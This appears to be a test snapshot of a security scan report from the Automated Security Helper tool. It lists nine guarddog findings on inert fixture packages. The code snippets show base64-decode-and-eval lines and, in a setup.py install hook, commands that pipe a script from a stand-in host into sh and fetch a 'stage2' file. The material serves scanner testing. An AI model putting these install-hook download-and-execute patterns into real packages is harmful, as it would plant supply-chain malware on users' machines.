# ASH security scan report

> [!CAUTION]
> **Review required**
>
> 9 findings at or above the configured scanner thresholds.
>
> **9 actionable** · 0 below threshold · 0 suppressed · 1/1 scanners completed
>
> Next action: Review findings by severity, then inspect the source.

Project: ASH · Scan executed: <TIMESTAMP>

## Summary

### Scanner results

| Scanner | Suppressed | Critical | High | Medium | Low | Info | Actionable | Result | Threshold |
| --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: | --- | --- |
| guarddog | 0 | 0 | 9 | 0 | 0 | 0 | 9 | FAILED | MEDIUM (unavailable) |

<details>
<summary>How to read scanner results</summary>

**Severity levels:** Critical, High, Medium, Low, Info. Suppressed findings are counted separately.

**Actionable** counts findings at or above each scanner's threshold.

**Result:** PASSED = no actionable findings; FAILED = threshold exceeded; MISSING = dependencies unavailable; SKIPPED = disabled; ERROR = execution error.

**Threshold** shows the minimum severity and its source: `global`, `config`, or `scanner`.

**Statistics calculation:** final aggregated SARIF, with suppressed findings excluded from actionable counts.

</details>


### Top 5 hotspots

Files with the most actionable findings.

| Finding count | File location |
| ---: | --- |
| 5 | pypi\_suspicious/setup.py |
| 1 | action\_suspicious/index.js |
| 1 | go\_suspicious/main.go |
| 1 | npm\_suspicious/index.js |
| 1 | gem\_suspicious/lib/ash\_guarddog\_fixture.rb |

## Detailed findings

Showing 9 of 9 actionable findings, highest severity first.

<details>
<summary>1. HIGH · threat-runtime-obfuscation-base64exec · action_suspicious/index.js:2</summary>

### Finding 1: threat-runtime-obfuscation-base64exec

- Severity: HIGH
- Scanner: guarddog
- Rule ID: threat-runtime-obfuscation-base64exec
- Location: action\_suspicious/index.js:2

Detects base64 decoding followed by code execution. MITRE ATT&amp;CK tactics: defense-evasion

Code snippet:

```
// Inert test fixture. Never run.
throw new Error("inert test fixture");
eval(Buffer.from("Y29uc29sZS5sb2coJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ==", "base64").toString());
```

</details>

<details>
<summary>2. HIGH · threat-runtime-obfuscation-base64exec · gem_suspicious/lib/ash_guarddog_fixture.rb:4</summary>

### Finding 2: threat-runtime-obfuscation-base64exec

- Severity: HIGH
- Scanner: guarddog
- Rule ID: threat-runtime-obfuscation-base64exec
- Location: gem\_suspicious/lib/ash\_guarddog\_fixture.rb:4

Detects base64 decoding followed by code execution. MITRE ATT&amp;CK tactics: defense-evasion

Code snippet:

```
raise "inert test fixture"
require "base64"
eval(Base64.decode64("cHV0cyAnaW5lcnQgZ3VhcmRkb2cgZml4dHVyZSc="))
```

</details>

<details>
<summary>3. HIGH · threat-runtime-obfuscation-base64exec · go_suspicious/main.go:11</summary>

### Finding 3: threat-runtime-obfuscation-base64exec

- Severity: HIGH
- Scanner: guarddog
- Rule ID: threat-runtime-obfuscation-base64exec
- Location: go\_suspicious/main.go:11

Detects base64 decoding followed by code execution. MITRE ATT&amp;CK tactics: defense-evasion

Code snippet:

```
panic("inert test fixture")
	payload, _ := base64.StdEncoding.DecodeString("ZWNobyBpbmVydA==")
	exec.Command("sh", "-c", string(payload)).Run()
}
```

</details>

<details>
<summary>4. HIGH · threat-runtime-obfuscation-base64exec · npm_suspicious/index.js:3</summary>

### Finding 4: threat-runtime-obfuscation-base64exec

- Severity: HIGH
- Scanner: guarddog
- Rule ID: threat-runtime-obfuscation-base64exec
- Location: npm\_suspicious/index.js:3

Detects base64 decoding followed by code execution. MITRE ATT&amp;CK tactics: defense-evasion

Code snippet:

```
// payload decodes to a console.log() call.
throw new Error("inert test fixture");
eval(Buffer.from("Y29uc29sZS5sb2coJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ==", "base64").toString());
```

</details>

<details>
<summary>5. HIGH · threat-process-download-exec · pypi_suspicious/setup.py:15</summary>

### Finding 5: threat-process-download-exec

- Severity: HIGH
- Scanner: guarddog
- Rule ID: threat-process-download-exec
- Location: pypi\_suspicious/setup.py:15

Detects download-and-execute patterns: fetching a remote file then executing it. MITRE ATT&amp;CK tactics: execution

Code snippet:

```
def run(self):
        exec(base64.b64decode("cHJpbnQoJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ=="))
        os.system("curl -s https://example.com/payload.sh | sh")
        os.system("wget http://203.0.113.10/stage2 -O <SYSTEM_TMP>/stage2")
```

</details>

<details>
<summary>6. HIGH · threat-runtime-obfuscation-base64exec · pypi_suspicious/setup.py:15</summary>

### Finding 6: threat-runtime-obfuscation-base64exec

- Severity: HIGH
- Scanner: guarddog
- Rule ID: threat-runtime-obfuscation-base64exec
- Location: pypi\_suspicious/setup.py:15

Detects base64 decoding followed by code execution. MITRE ATT&amp;CK tactics: defense-evasion

Code snippet:

```
def run(self):
        exec(base64.b64decode("cHJpbnQoJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ=="))
        os.system("curl -s https://example.com/payload.sh | sh")
        os.system("wget http://203.0.113.10/stage2 -O <SYSTEM_TMP>/stage2")
```

</details>

<details>
<summary>7. HIGH · threat-process-download-exec · pypi_suspicious/setup.py:16</summary>

### Finding 7: threat-process-download-exec

- Severity: HIGH
- Scanner: guarddog
- Rule ID: threat-process-download-exec
- Location: pypi\_suspicious/setup.py:16

Detects download-and-execute patterns: fetching a remote file then executing it. MITRE ATT&amp;CK tactics: execution

Code snippet:

```
exec(base64.b64decode("cHJpbnQoJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ=="))
        os.system("curl -s https://example.com/payload.sh | sh")
        os.system("wget http://203.0.113.10/stage2 -O <SYSTEM_TMP>/stage2")
        install.run(self)
```

</details>

<details>
<summary>8. HIGH · threat-network-exfiltration · pypi_suspicious/setup.py:17</summary>

### Finding 8: threat-network-exfiltration

- Severity: HIGH
- Scanner: guarddog
- Rule ID: threat-network-exfiltration
- Location: pypi\_suspicious/setup.py:17

Detects URLs to suspicious domains often used for exfiltration or C2; correlated with capability capability-network-lolbas. MITRE ATT&amp;CK tactics: exfiltration

Code snippet:

```
os.system("curl -s https://example.com/payload.sh | sh")
        os.system("wget http://203.0.113.10/stage2 -O <SYSTEM_TMP>/stage2")
        install.run(self)
```

</details>

<details>
<summary>9. HIGH · threat-process-download-exec · pypi_suspicious/setup.py:17</summary>

### Finding 9: threat-process-download-exec

- Severity: HIGH
- Scanner: guarddog
- Rule ID: threat-process-download-exec
- Location: pypi\_suspicious/setup.py:17

Detects download-and-execute patterns: fetching a remote file then executing it. MITRE ATT&amp;CK tactics: execution

Code snippet:

```
os.system("curl -s https://example.com/payload.sh | sh")
        os.system("wget http://203.0.113.10/stage2 -O <SYSTEM_TMP>/stage2")
        install.run(self)
```

</details>

<details>
<summary>Scan metadata</summary>

## Scan metadata

- Project: ASH
- Scan executed: <TIMESTAMP>
- Report generated: <TIMESTAMP>
- ASH version: <ASH_VERSION>

</details>

*Report generated by [Automated Security Helper (ASH)](https://github.com/awslabs/automated-security-helper) at <TIMESTAMP>*

Build with <3 at Amazon Web Services
